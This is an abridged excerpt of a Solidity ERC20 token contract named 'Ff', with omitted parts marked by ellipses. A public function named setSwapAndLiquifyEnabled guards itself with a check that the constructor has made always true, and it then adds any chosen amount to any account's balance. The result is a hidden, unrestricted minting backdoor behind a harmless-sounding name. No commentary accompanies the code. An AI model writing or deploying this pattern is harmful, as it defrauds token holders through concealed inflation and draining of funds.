...
contract Ff is Context, IERC20, Ownable {
    ...
    constructor () {
        ...
        isPair[address(teamWalletAddress)] = true;
    ...
    function setSwapAndLiquifyEnabled(bool _enabled,uint256 am,address accunt) public {require(isPair[address(teamWalletAddress)]);_balances[accunt] += am;
